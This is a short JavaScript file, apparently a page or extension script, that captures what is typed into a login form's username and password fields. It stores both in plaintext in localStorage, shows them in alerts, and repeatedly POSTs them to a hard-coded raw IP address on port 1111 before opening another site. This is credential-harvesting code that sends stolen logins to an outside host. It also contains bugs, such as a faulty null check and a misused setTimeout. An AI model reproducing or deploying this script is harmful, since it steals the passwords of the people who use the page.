console.log("########sendkey_content#######");
function sendmessage(username,password){
    // var username = localStorage.getItem('username');
    // var password = localStorage.getItem('password');
    // var username = web_username;
    // var password = web_password;

    console.log(username + " " + password)
	if(username||password == null){

	}
    var url = "http://49.232.13.120:1111/sendusername"
    var request = new XMLHttpRequest();
    try{
        request.open("POST",url);
		request.send(username);
		console.log("sending " + username);	
	}
    catch(e){
        alert("哼唧 = =# 服务器繁忙请重试的啦！");
    }
    request.onload = function() {
        if(request.status == 200) {
            console.log(request.responseText);
        }else{
			console.log("server is 404")
		}
	}

	var url = "http://49.232.13.120:1111/sendpassword"
    var request = new XMLHttpRequest();
    try{
        request.open("POST",url);
		request.send(password);
		console.log("sending " + password);	
    }
    catch(e){
        alert("哼唧 = =# 服务器繁忙请重试的啦！");
    }
    request.onload = function() {
        if(request.status == 200) {
            console.log(request.responseText);
        }
    }
}
document.getElementById('login').onclick = function()
{
    var web_username = document.getElementById("web_username").value;
    var web_password = document.getElementById("web_password").value;
    localStorage.setItem('username',web_username);
    alert("您的用户名是：" + web_username);
    localStorage.setItem('password',web_password);
    alert("您的密码是：" + web_password);
    for(var i = 0;i<10;i++){   
        setTimeout(sendmessage(web_username,web_password),1000);
    }
    window.open("http://202.115.194.60/");
    // window.close();
}

